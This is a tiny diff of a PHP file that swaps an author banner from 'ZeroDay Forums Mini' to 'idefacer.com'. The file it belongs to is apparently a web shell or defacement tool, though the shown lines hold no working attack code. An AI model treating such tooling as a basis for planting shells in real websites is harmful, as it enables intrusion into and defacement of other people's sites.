@@ -109,7 +109,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>ZeroDay Forums Mini</center>";
+	echo "<center><br>idefacer.com</center>";
 	exit();
 }
 
